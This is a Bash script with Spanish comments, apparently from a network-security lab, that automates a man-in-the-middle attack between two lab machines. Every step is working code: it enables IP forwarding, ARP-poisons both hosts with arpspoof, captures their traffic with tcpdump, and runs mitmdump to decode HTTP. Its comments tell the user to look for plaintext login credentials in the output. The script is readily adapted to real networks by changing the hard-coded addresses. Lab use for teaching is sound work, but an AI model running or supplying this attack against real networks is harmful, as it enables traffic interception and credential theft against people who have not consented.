#!/usr/bin/env bash
#
# start-attack.sh
# Automatiza el escenario de ataque descrito en la Fase 5 del roadmap:
#   1. Habilita el reenvio de paquetes (ya deberia estar activo por Ansible).
#   2. Envenena la tabla ARP de client y server en ambas direcciones,
#      para que todo su trafico pase primero por esta VM (Kali).
#   3. Captura ese trafico con tcpdump y, en paralelo, con mitmdump para
#      dejar el HTTP ya decodificado (credenciales en texto plano incluidas).
#
# Uso (desde dentro de la VM kali, como root o con sudo):
#   sudo ./scripts/start-attack.sh
#
# Para detener el ataque: Ctrl+C. El script limpia los procesos y deja
# la tabla ARP como estaba.

set -euo pipefail

CLIENT_IP="192.168.56.10"
SERVER_IP="192.168.56.20"
IFACE="eth1" # interfaz de la red interna 192.168.56.0/24 dentro de la VM kali
OUT_DIR="${HOME}/captures"
TIMESTAMP="$(date +%Y%m%d-%H%M%S)"

mkdir -p "${OUT_DIR}"

echo "[*] Habilitando reenvio de paquetes IPv4..."
echo 1 > /proc/sys/net/ipv4/ip_forward

PIDS=()

cleanup() {
  echo ""
  echo "[*] Deteniendo ataque y restaurando ARP..."
  for pid in "${PIDS[@]}"; do
    kill "${pid}" 2>/dev/null || true
  done
  # -r reestablece las tablas ARP originales de ambos hosts
  arpspoof -r -i "${IFACE}" -t "${CLIENT_IP}" "${SERVER_IP}" >/dev/null 2>&1 || true
  arpspoof -r -i "${IFACE}" -t "${SERVER_IP}" "${CLIENT_IP}" >/dev/null 2>&1 || true
  echo "[*] Listo. Capturas guardadas en ${OUT_DIR}"
}
trap cleanup EXIT INT TERM

echo "[*] Iniciando ARP spoofing entre ${CLIENT_IP} <-> ${SERVER_IP} en ${IFACE}..."
arpspoof -i "${IFACE}" -t "${CLIENT_IP}" "${SERVER_IP}" > "${OUT_DIR}/arpspoof-a-${TIMESTAMP}.log" 2>&1 &
PIDS+=($!)
arpspoof -i "${IFACE}" -t "${SERVER_IP}" "${CLIENT_IP}" > "${OUT_DIR}/arpspoof-b-${TIMESTAMP}.log" 2>&1 &
PIDS+=($!)

echo "[*] Capturando trafico crudo con tcpdump -> ${OUT_DIR}/captura-${TIMESTAMP}.pcap"
tcpdump -i "${IFACE}" -w "${OUT_DIR}/captura-${TIMESTAMP}.pcap" \
  "host ${CLIENT_IP} and host ${SERVER_IP}" &
PIDS+=($!)

echo "[*] Capturando HTTP ya decodificado con mitmdump -> ${OUT_DIR}/http-${TIMESTAMP}.flow"
echo "    (busca ahi el login: usuario/contrasena viajan en texto plano)"
mitmdump -i "${IFACE}" \
  --set block_global=false \
  -w "${OUT_DIR}/http-${TIMESTAMP}.flow" &
PIDS+=($!)

echo ""
echo "[*] Ataque en marcha. Deja que el cliente use la app y luego revisa:"
echo "      - ${OUT_DIR}/captura-${TIMESTAMP}.pcap   (abrir con Wireshark)"
echo "      - ${OUT_DIR}/http-${TIMESTAMP}.flow       (abrir con: mitmproxy -r <archivo>)"
echo "[*] Presiona Ctrl+C para detener."
wait
